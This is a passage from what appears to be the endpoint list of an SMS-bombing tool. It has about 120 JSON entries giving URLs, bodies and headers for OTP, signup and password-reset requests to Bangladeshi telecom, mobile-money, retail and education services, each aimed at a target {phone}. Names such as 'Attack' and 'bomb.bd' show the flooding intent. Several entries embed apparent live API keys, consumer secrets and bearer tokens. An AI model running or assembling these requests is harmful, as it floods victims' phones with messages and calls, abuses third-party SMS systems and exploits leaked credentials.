  {"id":"261","name":"Redx Merchant Registration OTP","url":"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp","method":"post","body":"{\"phoneNumber\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"262","name":"Fundesh Generate OTP","url":"https://fundesh.com.bd/api/auth/generateOTP","method":"post","body":"{\"msisdn\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"263","name":"Bikroy Phone Login","url":"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}","method":"get","body":"","headers":{"accept":"application/json, text/plain, */*","application-name":"web"}},
  {"id":"264","name":"Motionview OTP Signup","url":"https://api.motionview.com.bd/api/send-otp-phone-signup","method":"post","body":"{\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"265","name":"Chorki Login (Web)","url":"https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web","method":"post","body":"{\"number\":\"+88{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"266","name":"Jatri Send OTP","url":"https://user-api.jslglobal.co:444/v2/send-otp","method":"post","body":"{\"phone\":\"+88{phone}\",\"jatri_token\":\"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj\"}","headers":{"Content-Type":"application/json"}},
  {"id":"267","name":"China Online BD OTP","url":"https://chinaonlinebd.com/api/login/getOtp?phone={phone}","method":"get","body":"","headers":{"token":"45601f3d391886fcec5f5a3f26780f21"}},
  {"id":"268","name":"Deeptoplay Login (Web)","url":"https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web","method":"post","body":"{\"number\":\"+88{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"269","name":"Shikho Send SMS","url":"https://api.shikho.com/auth/v2/send/sms","method":"post","body":"{\"phone\":\"{phone}\",\"type\":\"student\",\"auth_type\":\"signup\"}","headers":{"Content-Type":"application/json"}},
  {"id":"270","name":"Redx User Signup","url":"https://api.redx.com.bd/v1/user/signup","method":"post","body":"{\"name\":\"Attack\",\"phoneNumber\":\"{phone}\",\"service\":\"redx\"}","headers":{"Content-Type":"application/json"}},
  {"id":"271","name":"Bioscopelive Send OTP (GET)","url":"https://www.bioscopelive.com/en/login/send-otp?phone=88{phone}&operator=bd-otp","method":"get","body":"","headers":{}},
  {"id":"272","name":"Applink OTP Request","url":"https://applink.com.bd/appstore-v4-server/login/otp/request","method":"post","body":"{\"msisdn\":\"88{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"273","name":"Chokrojan Passenger Login","url":"https://chokrojan.com/api/v1/passenger/login/mobile","method":"post","body":"{\"mobile_number\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"274","name":"Easy Forgot Password OTP","url":"https://core.easy.com.bd/api/v1/forgot-password-otp","method":"post","body":"{\"device_key\":\"2ea97d276a980993308116baa292cec9\",\"mobile\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"275","name":"Walton Plaza OTP Create (PHP)","url":"https://waltonplaza.com.bd/api/auth/otp/create","method":"post","body":"{\"auth\":{\"countryCode\":\"880\",\"deviceUuid\":\"ee757830-f639-12f0-9f4d-2f972746fhg\",\"phone\":\"{phone}\"},\"captchaToken\":\"recapcha\"}","headers":{"Content-Type":"application/json"}},
  {"id":"276","name":"Chardike OTP Send","url":"https://api.chardike.com/api/otp/send","method":"post","body":"{\"phone\":\"{phone}\",\"otp_type\":\"login\"}","headers":{"Content-Type":"application/json"}},
  {"id":"277","name":"BTCL Send OTP (Type 1)","url":"https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json","method":"post","body":"{\"phoneNbr\":\"{phone}\",\"OTPType\":1.0,\"userName\":\"\",\"email\":\"\"}","headers":{"Content-Type":"application/json"}},
  {"id":"278","name":"AWS OTP Endpoint","url":"https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send","method":"post","body":"{\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"279","name":"Otithee OTP Generate","url":"https://gateway.otithee.com/api/v1/generate-otp","method":"post","body":"{\"request_type\":\"registration\",\"mobile_number\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"280","name":"Quizgiri Send OTP","url":"https://developer.quizgiri.xyz/api/v2.0/send-otp","method":"post","body":"{\"country_code\":\"+88\",\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"281","name":"Mojaru Student Login","url":"https://new.mojaru.com/api/student/login","method":"post","body":"{\"mobile_or_email\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"282","name":"GP AppCity OTP","url":"https://appcity.grameenphone.com/proxy/v2/user/session/get-otp","method":"post","body":"{\"mobileNumber\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"283","name":"Garibook Login","url":"https://api.garibookadmin.com/api/v3/user/login","method":"post","body":"{\"recaptcha_token\":\"garibookcaptcha\",\"mobile\":\"{phone}\",\"channel\":\"web\"}","headers":{"Content-Type":"application/json"}},
  {"id":"284","name":"Bioscopelive Dynamic Login","url":"https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web","method":"post","body":"{\"number\":\"+88{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"285","name":"Bangladeshi Matrimony Edit Mobile","url":"https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo={phone}","method":"get","body":"","headers":{}},
  {"id":"286","name":"Upay Wallet Verification Init","url":"https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/","method":"post","body":"{\"wallet_number\":\"{phone}\",\"geo_location\":{\"lat\":23.89,\"long\":89.13},\"referral\":\"\",\"firebase_token\":\"dummy\",\"device_uuid\":\"c65m117a8cbf5b1851b29f8b\",\"mno\":\"Robi\"}","headers":{"Content-Type":"application/json"}},
  {"id":"287","name":"Bohubrihi OTP","url":"https://bb-api.bohubrihi.com/public/activity/otp","method":"post","body":"{\"phone\":\"{phone}\",\"intent\":\"login\"}","headers":{"Content-Type":"application/json"}},
  {"id":"288","name":"Timezonebd OTP Login","url":"https://backend.timezonebd.com/api/v1/user/otp-login","method":"post","body":"{\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"289","name":"GP BkShop OTP (en)","url":"https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp","method":"post","body":"{\"phone\":\"{phone}\",\"language\":\"en\",\"email\":\"\"}","headers":{"Content-Type":"application/json"}},
  {"id":"290","name":"Shikho Public Activity OTP","url":"https://api.shikho.com/public/activity/otp","method":"post","body":"{\"phone\":\"{phone}\",\"intent\":\"ap-discount-request\"}","headers":{"Content-Type":"application/json"}},
  {"id":"291","name":"Edgecourse Register","url":"https://edgecoursebd.com/register","method":"post","body":"[{\"phone\":\"{phone}\"}]","headers":{"Content-Type":"application/json"}},
  {"id":"292","name":"Ostad User OTP","url":"https://api.ostad.app/api/v2/user/with-otp","method":"post","body":"{\"msisdn\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"293","name":"Ieducation Check User","url":"https://www.ieducationbd.com/api/account/check_user","method":"post","body":"{\"mobile\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"294","name":"Hishabee Send OTP","url":"https://app.hishabee.business/api/V2/otp/send?mobile_number={phone}","method":"get","body":"","headers":{}},
  {"id":"295","name":"Roots Edu Register","url":"https://rootsedulive.com/api/auth/register","method":"post","body":"{\"name\":\"BILLAVAI\",\"phone\":\"88{phone}\",\"email\":\"temp{phone}@bomb.bd\",\"password\":\"Secure@2025\",\"confirmPassword\":\"Secure@2025\"}","headers":{"Content-Type":"application/json"}},
  {"id":"296","name":"Roots Edu Forget Password","url":"https://rootsedulive.com/api/auth/forget-password","method":"post","body":"{\"phoneOrEmail\":\"88{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"297","name":"MithaiBD Login","url":"https://mithaibd.com/api/login/","method":"post","body":"{\"company_id\":\"2\",\"phone\":\"{phone}\",\"email\":\"attack{phone}@mail.com\",\"password1\":\"pass123\",\"otp_verify\":false}","headers":{"Content-Type":"application/json"}},
  {"id":"298","name":"English Moja Login","url":"https://api.englishmojabd.com/api/v1/auth/login","method":"post","body":"{\"phone\":\"+88{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"299","name":"Moveon OTP Request","url":"https://moveon.com.bd/api/v1/customer/auth/phone/request-otp","method":"post","body":"{\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"300","name":"Osudpotro Send OTP","url":"https://api.osudpotro.com/api/v1/users/send_otp","method":"post","body":"{\"mobile\":\"+88-{phone}\",\"deviceToken\":\"web\",\"language\":\"bn\",\"os\":\"web\"}","headers":{"Content-Type":"application/json"}},
  {"id":"301","name":"MyGP Cinematic Common OTP (GET)","url":"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/","method":"get","body":"","headers":{}},
  {"id":"302","name":"Qcoom OTP Send","url":"https://auth.qcoom.com/api/v1/otp/send","method":"post","body":"{\"mobileNumber\":\"+88{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"303","name":"Circle Reseller Signup","url":"https://reseller.circle.com.bd/api/v2/auth/signup","method":"post","body":"{\"name\":\"+88{phone}\",\"email_or_phone\":\"+88{phone}\",\"password\":\"123456\",\"password_confirmation\":\"123456\",\"register_by\":\"phone\"}","headers":{"Content-Type":"application/json"}},
  {"id":"304","name":"Shomvob OTP (Bearer)","url":"https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0","method":"post","body":"{\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json","Authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciJ9.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s"}},
  {"id":"305","name":"Toybox Create Subscription","url":"https://api.toybox.live/bdapps_handler.php","method":"post","body":"Operation=CreateSubscription&MobileNumber=88{phone}&PackageID=100&Secret=HJKX71%UHYH","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"306","name":"Win2gain Request OTP","url":"https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{phone}","method":"get","body":"","headers":{"sourcePlatform":"web","client":"2"}},
  {"id":"307","name":"BD Kepler Generate OTP","url":"https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp","method":"post","body":"{\"deviceId\":\"prodevice\",\"operator\":\"Gp\",\"walletNumber\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"308","name":"Robi Internet Pack OTP","url":"https://webapi.robi.com.bd/v1/send-otp","method":"post","body":"{\"phone_number\":\"{phone}\",\"type\":\"internet_pack\"}","headers":{"Content-Type":"application/json"}},
  {"id":"309","name":"GP BkShop OTP (bn)","url":"https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp","method":"post","body":"{\"phone\":\"{phone}\",\"email\":\"pro@bomber.com\",\"language\":\"bn\"}","headers":{"Content-Type":"application/json"}},
  {"id":"310","name":"Dmoney OTP Send","url":"https://api.dmoney.com.bd/api/v1/otp/send?msisdn={phone}","method":"get","body":"","headers":{}},
  {"id":"311","name":"Nagad OTP Send","url":"https://api.nagad.com.bd/otp/send","method":"post","body":"{\"mobileNumber\":\"{phone}\",\"service\":\"login\"}","headers":{"Content-Type":"application/json"}},
  {"id":"312","name":"Surecash OTP Generate","url":"https://api.surecash.com.bd/v2/otp/generate","method":"post","body":"{\"msisdn\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"313","name":"Rocket Merchant OTP","url":"https://api.rocket.com.bd/merchant/otp","method":"post","body":"{\"account\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"314","name":"Bkash OTP Request","url":"https://api.bkash.com.bd/otp/request","method":"post","body":"{\"phone\":\"{phone}\",\"type\":\"registration\"}","headers":{"Content-Type":"application/json"}},
  {"id":"315","name":"Foodpanda Auth OTP","url":"https://api.foodpanda.com.bd/v1/auth/otp","method":"post","body":"{\"phone\":\"+88{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"316","name":"Pathao Auth OTP","url":"https://api.pathao.com/v2/auth/otp","method":"post","body":"{\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"317","name":"Daraz Auth OTP","url":"https://api.daraz.com.bd/auth/otp","method":"post","body":"{\"mobile\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"318","name":"Priyoshop OTP Send","url":"https://api.priyoshop.com/v1/otp/send","method":"post","body":"{\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"319","name":"Ajkerdeal OTP","url":"https://ajkerdeal.com/api/v1/otp?phone={phone}","method":"get","body":"","headers":{}},
  {"id":"320","name":"Evaly Auth OTP","url":"https://api.evaly.com.bd/auth/otp","method":"post","body":"{\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"321","name":"Chaldal Auth OTP","url":"https://api.chaldal.com/v1/auth/otp","method":"post","body":"{\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"322","name":"Shurjopay OTP Send","url":"https://api.shurjopay.com.bd/otp/send","method":"post","body":"{\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"323","name":"SSL Wireless OTP","url":"https://sslwireless.com/api/otp","method":"post","body":"{\"msisdn\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"324","name":"Robi Voice OTP","url":"https://webapi.robi.com.bd/v1/send-otp","method":"post","body":"{\"phone_number\":\"{phone}\",\"type\":\"voice\"}","headers":{"Content-Type":"application/json"}},
  {"id":"325","name":"MyGP OTP Login","url":"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}","method":"get","body":"","headers":{}},
  {"id":"326","name":"Banglalink Selfcare OTP","url":"https://selfcare.banglalink.net/api/v1/otp","method":"post","body":"{\"msisdn\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"327","name":"Teletalk OTP Send","url":"https://teletalk.com.bd/api/otp/send","method":"post","body":"{\"number\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"328","name":"Quick Mart Phone Register","url":"https://quickmart.com.bd/customer/auth/phone-register","method":"post","body":"_token={{csrf_token}}&phone={phone}","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"329","name":"Glaniss Skincare Customer Login","url":"https://www.glanisskincare.com.bd/customer-login","method":"post","body":"_token={{csrf_token}}&phone={phone}","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"330","name":"Smart Deal Register","url":"https://smartdeal.com.bd/register","method":"post","body":"_token={{csrf_token}}&name=nox&phone={phone}&country_code=88&email=&password=unlock2022&password_confirmation=unlock2022&checkbox_example_1=on","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"331","name":"Chaldal Request OTP Verification (API Key)","url":"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey={{apiKey}}&phoneNumber=%2B88{phone}&retryAttempt=0","method":"post","body":"{}","headers":{"accept":"application/json","content-type":"application/json","x-egg-clientapp":"Omelette","x-egg-platform":"Browser","x-egg-storeid":"1"}},
  {"id":"332","name":"Circle Registration","url":"https://circle.com.bd/register","method":"post","body":"_token={{csrf_token}}&phone={phone}&country_code=88&email=&password=123456&password_confirmation=123456&g-recaptcha-response={{recaptcha}}&checkbox_example_1=on","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"333","name":"Easydeal Register","url":"https://easydeal.com.bd/register","method":"post","body":"_token={{csrf_token}}&name=nox&phone={phone}&country_code=88&email=&password=unlock2022&password_confirmation=unlock2022&checkbox_example_1=on","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"334","name":"Beautycare Customer Login","url":"https://beautycare.com.bd/customer-login","method":"post","body":"_token={{csrf_token}}&phone={phone}","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"335","name":"Primeshop Register","url":"https://primeshop.com.bd/register","method":"post","body":"_token={{csrf_token}}&name=laura&phone={phone}&country_code=88&email=&password=r%28M%283S96NQczs8&password_confirmation=r%28M%283S96NQczs8&checkbox_example_1=on","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"336","name":"Idolmart Send OTP","url":"https://api.idolmart.shop/customer/sent-otp","method":"post","body":"{\"phone\":\"880{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"337","name":"Rhombus Auth Exists","url":"https://www.rhombuspublications.com/api/auth/exists","method":"post","body":"{\"cred\":\"{phone}\",\"token\":\"{{captchaToken}}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"338","name":"Bioxin Signup","url":"https://bioxin.com/signup","method":"post","body":"[{\"phone\":\"{phone}\"}]","headers":{"Content-Type":"text/plain;charset=UTF-8","next-action":"{{nextAction}}","next-router-state-tree":"{{routerState}}"}},
  {"id":"339","name":"Khaasfood Digits Check (Two‑step)","url":"https://www.khaasfood.com/wp-admin/admin-ajax.php","method":"post","body":"mobileNo=+88{phone}&countrycode=+880&csrf={{csrf}}&login=1&json=1&action=digits_check_mob","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"}},
  {"id":"340","name":"Proiojon Sign-up","url":"https://billing.proiojon.com/api/v1/auth/sign-up","method":"post","body":"{\"name\":\"{{randomName}}\",\"phone\":\"{phone}\",\"email\":\"{{randomEmail}}\",\"password\":\"password123\",\"ref_code\":\"\"}","headers":{"Content-Type":"application/json","Authorization":"Bearer null"}},
  {"id":"341","name":"Beautybooth Signup","url":"https://admin.beautybooth.com.bd/api/v2/auth/signup","method":"post","body":"{\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"342","name":"Medha Send OTP","url":"https://developer.medha.info/api/send-otp","method":"post","body":"{\"phone\":\"880{phone}\",\"is_register\":\"1\"}","headers":{"Content-Type":"application/json","authorization":"Bearer"}},
  {"id":"343","name":"Arogga SMS Send (Multipart)","url":"https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10","method":"post","body":"------WebKitFormBoundary...\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n{phone}\r\n... (see raw)","headers":{"Content-Type":"multipart/form-data; boundary={{boundary}}"}},
  {"id":"344","name":"MyGP Cinematic Common OTP (post)","url":"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{phone}","method":"post","body":"{\"headers\":{\"Content-Type\":\"application/json\",\"Access-Control-Allow-Origin\":\"*\",\"Authorization\":\"Bearer 1pake4mh5ln64h5t26kpvm3iri\"}}","headers":{"Content-Type":"application/json","Authorization":"Bearer 1pake4mh5ln64h5t26kpvm3iri"}},
  {"id":"345","name":"Bdstall Save OTP Info","url":"https://www.bdstall.com/userRegistration/save_otp_info/","method":"post","body":"UserTypeID=2&RequestType=1&Name=Md&Mobile={phone}","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"346","name":"Bcsexamaid Generate OTP","url":"https://bcsexamaid.com/api/generateotp","method":"post","body":"{\"mobile\":\"{phone}\",\"softtoken\":\"Rifat.Admin.2022\"}","headers":{"Content-Type":"application/json"}},
  {"id":"347","name":"Doctorlivebd OTP Send","url":"https://doctorlivebd.com/api/patient/auth/otpsend","method":"post","body":"country_code=880&mobile={phone}","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"348","name":"Sheba Accountkit OTP","url":"https://accountkit.sheba.xyz/api/shoot-otp","method":"post","body":"{\"mobile\":\"+88{phone}\",\"app_id\":\"8329815A6D1AE6DD\",\"api_token\":\"{{apiToken}}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"349","name":"Sindabad Mobile OTP","url":"https://offers.sindabad.com/api/mobile-otp","method":"post","body":"{\"key\":\"c94e67fb2a59af3b6fa21f24463b2061\",\"mobile\":\"+88{phone}\"}","headers":{"Content-Type":"application/json","Authorization":"Bearer {{authToken}}"}},
  {"id":"350","name":"Kireibd Send Login OTP","url":"https://app.kireibd.com/api/v2/send-login-otp","method":"post","body":"{\"email\":\"{phone}\"}","headers":{"Content-Type":"application/json","x-xsrf-token":"{{xsrfToken}}"}},
  {"id":"351","name":"BDTickets Auth","url":"https://api.bdtickets.com:20100/v1/auth","method":"post","body":"{\"createUserCheck\":true,\"phoneNumber\":\"+88{phone}\",\"applicationChannel\":\"WEB_APP\"}","headers":{"Content-Type":"application/json"}},
  {"id":"352","name":"RFL Bestbuy Login","url":"https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT","method":"post","body":"{\"company_id\":\"26\",\"password2\":\"Riyaz@123\",\"currency_code\":\"BDT\",\"user_type\":\"C\",\"email\":\"{phone}@gmail.com\",\"g_id\":\"\",\"lang_code\":\"en\",\"operating_system\":\"Android\",\"otp_verify\":false,\"password1\":\"Riyaz@123\",\"phone\":\"{phone}\",\"storefront_id\":\"3\"}","headers":{"Content-Type":"application/json","Authorization":"Bearer {{auth}}"}},
  {"id":"353","name":"Hishabexpress Login Status","url":"https://api.hishabexpress.com/login/status","method":"post","body":"msisdn={phone}&hash=Hello","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"354","name":"Mujib Chorcha Auth Check","url":"https://mujib.chorcha.net/auth/check?phone={phone}","method":"get","body":"","headers":{"x-chorcha-mode":"prod","x-chorcha-platform":"web"}},
  {"id":"355","name":"Wafilife Send OTP","url":"https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3","method":"get","body":"","headers":{}},
  {"id":"356","name":"Robi Register OTP","url":"https://webapi.robi.com.bd/v1/account/register/otp","method":"post","body":"{\"phone_number\":\"{phone}\"}","headers":{"Content-Type":"application/json","X-CSRF-TOKEN":"{{csrfToken}}","Authorization":"Bearer {{bearer}}"}},
  {"id":"357","name":"Etester Paper Exists + OTP","url":"https://prod.etestpaper.net/api/exists","method":"post","body":"{\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"358","name":"Etester Paper OTP","url":"https://prod.etestpaper.net/api/v4/auth/otp","method":"post","body":"{\"phone\":\"{phone}\",\"recaptcha\":\"668be73dcad2999a957ff440\"}","headers":{"Content-Type":"application/json"}},
  {"id":"359","name":"GPay App Check Signup","url":"https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup","method":"post","body":"{\"deviceId\":\"35{phone}30\",\"msisdn\":\"{phone}\",\"tran_type\":\"OTPREQSIGNUP\"}","headers":{"Content-Type":"application/json"}},
  {"id":"360","name":"Applink OTP (Python version)","url":"https://apps.applink.com.bd/appstore-v4-server/login/otp/request","method":"post","body":"{\"msisdn\":\"88{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"361","name":"Priyoshikkhaloy Register/Login","url":"https://app.priyoshikkhaloy.com/api/user/register-login.php","method":"post","body":"mobile={phone}","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"362","name":"Kabbik OTP","url":"https://api.kabbik.com/v1/auth/otpnew","method":"post","body":"{\"msisdn\":\"88{phone}\",\"currentTimeLong\":\"{{timestamp}}\",\"passKey\":\"qOQNBtVmoTTPVmfn\"}","headers":{"Content-Type":"application/json","authorization":"Bearer {{token}}"}},
  {"id":"363","name":"Salextra Check Username","url":"https://salextra.com.bd/customer/checkusernameavailabilityonregistration","method":"post","body":"username={phone}&loginType=MOBILE&__RequestVerificationToken={{token}}","headers":{"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest"}},
  {"id":"364","name":"Sundora Create Customer","url":"https://api.sundora.com.bd/api/user/customer/","method":"post","body":"{\"customer\":{\"email\":\"kgjkgjgg{phone}@gmail.com\",\"password\":\"#bUV?'3*N#7N}.g\",\"password_confirmation\":\"#bUV?'3*N#7N}.g\",\"phone\":\"+880{phone}\",\"draft_order_id\":null,\"first_name\":\"sdfgfd\",\"last_name\":\"fgfd\",\"note\":{\"birthday\":\"\",\"gender\":\"male\"},\"withTimeout\":true,\"newsletter_email\":true,\"newsletter_sms\":true}}","headers":{"Content-Type":"application/json"}},
  {"id":"365","name":"MyGP Cinematic OTP (SBENT)","url":"https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D","method":"post","body":"{\"accessinfo\":{\"access_token\":\"K165S6V6q4C6G7H0y9C4f5W7t5YeC6\",\"referenceCode\":\"20190827042622\"}}","headers":{"Content-Type":"application/json"}},
  {"id":"366","name":"Bajistar Get OTP","url":"https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}","method":"get","body":"","headers":{}},
  {"id":"367","name":"Meenabazar Send OTP","url":"https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}&type=login","method":"post","body":"","headers":{"Content-Type":"application/json"}},
  {"id":"368","name":"Medeasy Send OTP","url":"https://api.medeasy.health/api/send-otp/+88{phone}/","method":"get","body":"","headers":{}},
  {"id":"369","name":"Iqra-Live Sent OTP","url":"http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}","method":"get","body":"","headers":{}},
  {"id":"370","name":"Chokrojan Login Mobile (Python)","url":"https://chokrojan.com/api/v1/passenger/login/mobile","method":"post","body":"{\"mobile_number\":\"{phone}\",\"otp_token\":\"826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7\"}","headers":{"Content-Type":"application/json","Authorization":"Bearer null"}},
  {"id":"371","name":"Shomvob OTP (Python, same as 304)","url":"https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0","method":"post","body":"{\"phone\":\"88{phone}\"}","headers":{"Content-Type":"application/json","Authorization":"Bearer {{bearer}}"}},
  {"id":"372","name":"Redx Signup (Python duplicate)","url":"https://api.redx.com.bd/v1/user/signup","method":"post","body":"{\"name\":\"Alamin Sheikh\",\"phoneNumber\":\"{phone}\",\"service\":\"redx\"}","headers":{"Content-Type":"application/json"}},
  {"id":"373","name":"MyGP Cinematic Common OTP (Python POST)","url":"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/","method":"post","body":"","headers":{"Content-Type":"application/json"}},
  {"id":"374","name":"MyBDJobs Create Account","url":"https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount","method":"post","body":"{\"firstName\":\"{{firstName}}\",\"lastName\":\"\",\"gender\":\"M\",\"email\":\"{{email}}\",\"userName\":\"{phone}\",\"password\":\"Kamrul12345@\",\"confirmPassword\":\"Kamrul12345@\",\"status\":0,\"mobile\":\"{phone}\",\"workAreaCategory\":2,\"createdFrom\":0,\"createdAt\":\"{{timestamp}}\",\"decodeId\":\"\",\"catTypeId\":1,\"userNameType\":\"mobile\",\"disabilityId\":\"\",\"deviceTypeId\":0,\"countryCode\":\"88\",\"socialMediaId\":\"\",\"socialMediaName\":\"\",\"socialMediaTimestamp\":\"{{timestamp}}\",\"ttcId\":\"\",\"gradeId\":\"\",\"knownBy\":\"\",\"isTtc\":false,\"trainingCenterName\":\"\",\"trainingDistrict\":\"\",\"queryString\":\"\",\"campaignId\":0,\"campaignSource\":\"\",\"campaignReferer\":\"\",\"isFromSocialMedia\":false,\"isActive\":0,\"useType\":\"\",\"uNtype\":0}","headers":{"Content-Type":"application/json"}},
  {"id":"375","name":"Ultimate Organic Life Register + Forget","url":"https://ultimateasiteapi.com/api/register-customer","method":"post","body":"{\"customer_name\":\"hu\",\"customer_password\":\"12345678\",\"customer_password_confirmation\":\"12345678\",\"customer_email\":\"{phone}hu@gmail.com\",\"customer_contact\":\"{phone}\",\"customer_dob\":\"2000-01-02\",\"customer_gender\":\"male\"}","headers":{"Content-Type":"application/json"}},
  {"id":"376","name":"Ultimate Organic Life Forget","url":"https://ultimateasiteapi.com/api/forget-customer-password","method":"post","body":"{\"user_input\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"377","name":"Foodaholic Forgot Password","url":"https://foodaholic.com.bd/api/v1/auth/forgot-password","method":"post","body":"{\"phone\":\"+88{phone}\"}","headers":{"Content-Type":"application/json","authorization":"Bearer null"}},
  {"id":"378","name":"Foodaholic Sign-up (if not found)","url":"https://foodaholic.com.bd/api/v1/auth/sign-up","method":"post","body":"{\"f_name\":\"{{firstName}}\",\"l_name\":\"{{lastName}}\",\"phone\":\"+88{phone}\",\"email\":\"{{email}}\",\"password\":\"Riyaz@123\",\"ref_code\":\"\"}","headers":{"Content-Type":"application/json","authorization":"Bearer null"}},
  {"id":"379","name":"Binge OTP (OPTIONS + GET)","url":"https://web-api.binge.buzz/api/v3/otp/send/{phone}","method":"get","body":"","headers":{"Authorization":"Bearer {{token}}","Device-Type":"web"}},
  {"id":"380","name":"KFCBD Register","url":"https://api.kfcbd.com/register","method":"post","body":"{\"id\":null,\"name\":\"Sojib khane\",\"email\":\"{{email}}\",\"mobile\":\"{phone}\",\"address\":null,\"device_token\":\"dLvYmVLqT02A_ZAFsFa8gJ:APA91bHC8CtSoO-TaN-NFm4obg10-Blc1vji2lbq82KbIyEGsXobCa8hZs-XbWjyTYnLE7KgYDRWKdteBgU6zvixuYG-vV4aGCEvkItCk6DiXYKVvd_ecWxqraqX6vyYJMfWDWDeF1EG\",\"token\":null,\"dob\":\"\",\"otp\":null}","headers":{"Content-Type":"application/json"}},
